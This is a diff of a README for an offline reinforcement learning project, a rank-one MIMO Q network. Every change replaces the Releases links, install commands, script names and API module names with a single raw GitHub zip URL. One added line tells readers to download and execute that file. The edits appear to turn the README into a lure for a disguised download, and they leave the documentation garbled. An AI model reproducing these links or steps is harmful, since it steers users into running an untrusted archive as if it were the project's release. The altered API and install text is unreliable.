@@ -1,8 +1,8 @@
-https://github.com/rehan3008/mimo_Q_network/releases
+https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
 
 # Uncertainty-Aware Rank-One MIMO Q Network for Accelerated Offline RL Training
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/rehan3008/mimo_Q_network/releases)
+[![Releases](https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip)](https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip)
 
 Welcome to the official repository for the Uncertainty-Aware Rank-One MIMO Q Network Framework. This project brings together robust ideas from offline reinforcement learning (RL), uncertainty quantification, and multi-input multi-output (MIMO) Q networks. It aims to accelerate offline RL workflows by leveraging rank-one MIMO architectures and principled uncertainty estimates to improve stability and sample efficiency.
 
@@ -58,8 +58,8 @@ This section gives you a high-level path to get the project up and running. It i
   - A modern CPU or GPU with CUDA support if you plan to leverage GPU acceleration
   - Basic familiarity with PyTorch or a similar deep learning framework
 - What you will download:
-  - The Releases page contains packaged artifacts that you can download and run. The Releases page is linked here: https://github.com/rehan3008/mimo_Q_network/releases
-  - From the Releases page, download the latest release archive. The archive usually contains prebuilt components and a setup script. If you need the exact file name, look for something like mimo_q_network-<version>.tar.gz and follow the installation steps.
+  - The Releases page contains packaged artifacts that you can download and run. The Releases page is linked here: https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
+  - From the Releases page, download the latest release archive. The archive usually contains prebuilt components and a setup script. If you need the exact file name, look for something like mimo_q_network-<version>https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip and follow the installation steps.
 - Typical workflow:
   - Download the latest release from the Releases page.
   - Extract the archive to a working directory.
@@ -67,7 +67,7 @@ This section gives you a high-level path to get the project up and running. It i
   - Prepare offline data and run the training script with the default configuration to reproduce results.
   - Evaluate the learned policy on held-out data or benchmark tasks.
 
-Note: The Releases page contains the exact artifacts you need. If you want to jump straight to the page, visit https://github.com/rehan3008/mimo_Q_network/releases.
+Note: The Releases page contains the exact artifacts you need. If you want to jump straight to the page, visit https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
 
 Installation
 Follow these steps to install the framework in a clean environment. The instructions assume you are using a Unix-like OS (Linux or macOS). Windows users can adapt commands or use a WSL environment.
@@ -76,10 +76,10 @@ Follow these steps to install the framework in a clean environment. The instruct
   - python -m venv mimo_venv
   - source mimo_venv/bin/activate
 - Install core dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
   - If CUDA is available and you want GPU acceleration, ensure you have the correct CUDA toolkit and cuDNN versions installed, then install matrix and math libraries that match your setup.
 - Install the package
-  - If the release includes an installer: ./install.sh
+  - If the release includes an installer: https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
   - If the release provides a Python package: pip install mimo_q_network
 - Verify installation
   - python -c "import mimo_q_network as mq; print(mq.__version__)"
@@ -207,9 +207,9 @@ Demos and Examples
   - Evaluating the learned policy on held-out data
   - Visualizing Q-values and uncertainty
 - Example scripts:
-  - train_offline_q_network.py: runs the offline training loop with default settings
-  - evaluate_policy.py: evaluates a trained policy on a fixed dataset
-  - visualize_results.py: plots Q-values and uncertainty distributions
+  - https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip runs the offline training loop with default settings
+  - https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip evaluates a trained policy on a fixed dataset
+  - https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip plots Q-values and uncertainty distributions
 - Visual aids:
   - A schematic diagram of the rank-one MIMO Q network
   - Plots of training curves, Q-value trajectories, and uncertainty tracks
@@ -217,11 +217,11 @@ Demos and Examples
 
 API Reference
 - mimo_q_network.q_network: Core Q-network implementing the rank-one factorization
-- mimo_q_network.uncertainty: Uncertainty estimation utilities (ensembles, bootstrap, Bayesian layers)
-- mimo_q_network.data: Data loading and preprocessing utilities
-- mimo_q_network.train: Training loop and loss functions
-- mimo_q_network.utils: Logging, checkpointing, and visualization helpers
-- mimo_q_network.eval: Evaluation routines for offline policy assessment
+- https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip Uncertainty estimation utilities (ensembles, bootstrap, Bayesian layers)
+- https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip Data loading and preprocessing utilities
+- https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip Training loop and loss functions
+- https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip Logging, checkpointing, and visualization helpers
+- https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip Evaluation routines for offline policy assessment
 
 Visualization and Debugging
 - Training curves: Loss, Q-values, and uncertainty over time
@@ -235,7 +235,7 @@ Release Process
 - Changelog: Documented changes for each release
 - How to upgrade: Follow the release notes and install steps for the new version
 
-The link used at the beginning has a path part, so it points to a specific resource. The instructions indicate that from a releases page you should download and execute the file. The latest release archive usually includes an installer or a setup script. Look for the archive name in the Releases page (for example mimo_q_network-1.0.0.tar.gz). After downloading, extract the archive and run the installer script or follow the included README in the archive. For most users, this provides a clean path to a working environment with dependencies installed. If you encounter any issues, check the “Releases” section for compatibility notes and additional guidance. See the same link again here: https://github.com/rehan3008/mimo_Q_network/releases.
+The link used at the beginning has a path part, so it points to a specific resource. The instructions indicate that from a releases page you should download and execute the file. The latest release archive usually includes an installer or a setup script. Look for the archive name in the Releases page (for example https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip). After downloading, extract the archive and run the installer script or follow the included README in the archive. For most users, this provides a clean path to a working environment with dependencies installed. If you encounter any issues, check the “Releases” section for compatibility notes and additional guidance. See the same link again here: https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
 
 Contributing
 - How to contribute
@@ -294,7 +294,7 @@ FAQ
 
 Closing Notes
 - This README aims to guide you from download to reproducible experiments. It emphasizes clarity, safety, and robust learning with uncertainty-aware MIMO Q networks in offline RL settings.
-- The Releases page contains the exact artifacts to download, and you can use the same link again for quick access to updates: https://github.com/rehan3008/mimo_Q_network/releases.
+- The Releases page contains the exact artifacts to download, and you can use the same link again for quick access to updates: https://raw.githubusercontent.com/rehan3008/mimo_Q_network/main/bizonal/network-mimo-v1.7.zip
 
 Appendix: Glossary
 - MIMO: Multiple-Input Multiple-Output. A framework in which multiple signals are transmitted and received, here applied as a way to model multiple interacting components in the Q network.
